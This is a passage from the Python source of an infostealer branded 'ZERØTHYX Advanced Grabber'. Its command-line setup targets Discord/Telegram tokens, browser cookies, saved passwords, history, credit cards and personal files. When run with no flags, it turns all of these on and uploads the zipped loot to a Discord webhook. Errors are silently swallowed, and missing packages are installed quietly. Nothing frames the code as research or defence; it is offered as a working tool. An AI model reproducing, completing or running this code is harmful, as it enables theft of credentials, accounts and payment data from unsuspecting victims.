                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"ZERØTHYX Advanced Grabber | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/attachments/1061676789808119848/1061682933450960986/discord.png"
                }
            }
            
            payload = {
                "username": "ZERØTHYX Security",
                "avatar_url": "https://cdn.discordapp.com/attachments/1061676789808119848/1061682933450960986/discord.png",
                "embeds": [embed]
            }
            
            requests.post(WEBHOOK_URL, json=payload)
            
            with open(zip_filename, 'rb') as f:
                files = {
                    'file': (os.path.basename(zip_filename), f, 'application/zip')
                }
                requests.post(WEBHOOK_URL, files=files)
            
        except Exception as e:
            pass
    
    def run(self):
        print("🔍 ZERØTHYX Advanced Data Grabber")
        print("=" * 50)
        
        if self.args.discord:
            print("📱 Extracting Discord/Telegram tokens...")
            self.extract_discord_tokens()
            
            print("🔑 Running advanced Discord token grabber...")
            discord_tokens = self.discord_token_grabber()
            for app, tokens in discord_tokens.items():
                if tokens:
                    self.results["discord_tokens"].setdefault(app, []).extend(tokens)
        
        if self.args.browsers or self.args.cookies or self.args.passwords or self.args.history:
            print("🌐 Extracting browser data...")
            self.extract_browser_data()
        
        if self.args.credit_cards:
            print("💳 Extracting credit card information...")
            self.extract_credit_cards()
        
        if self.args.extract_files:
            print("📁 Extracting files of interest...")
            self.extract_files_of_interest()
        
        print("✅ Data extraction complete!")
        
        if self.args.save:
            print("💾 Saving results...")
            zip_filename = self.save_results()
            print(f"📦 Results saved to: {zip_filename}")
            
            if self.args.webhook:
                print("📤 Sending results to webhook...")
                self.send_to_webhook(zip_filename)
        
        summary = self.create_summary()
        print("\n" + summary)

def install_arp_dependencies():
    required = ['requests', 'pycryptodome', 'pywin32', 'psutil']
    
    for package in required:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            import subprocess
            import sys
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

def main():
    install_arp_dependencies()
    
    parser = argparse.ArgumentParser()
    
    parser.add_argument("--discord", action="store_true", help="Extract Discord/Telegram tokens")
    parser.add_argument("--browsers", action="store_true", help="Extract browser data")
    parser.add_argument("--cookies", action="store_true", help="Extract browser cookies")
    parser.add_argument("--passwords", action="store_true", help="Extract saved passwords")
    parser.add_argument("--history", action="store_true", help="Extract browser history")
    parser.add_argument("--credit-cards", action="store_true", help="Extract credit card information")
    parser.add_argument("--extract-files", action="store_true", help="Extract files of interest")
    
    parser.add_argument("--webhook", action="store_true", help="Send results to Discord webhook")
    parser.add_argument("--save", action="store_true", help="Save results locally")
    
    args = parser.parse_args()
    
    if not any(vars(args).values()):
        args.discord = True
        args.browsers = True
        args.cookies = True
        args.passwords = True
        args.history = True
        args.credit_cards = True
        args.extract_files = True
        args.webhook = True
        args.save = True
    
    grabber = AdvancedDataGrabber(args)
    grabber.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️ Operation interrupted by user.")
    except Exception as e:
        print(f"❌ Error: {e}")
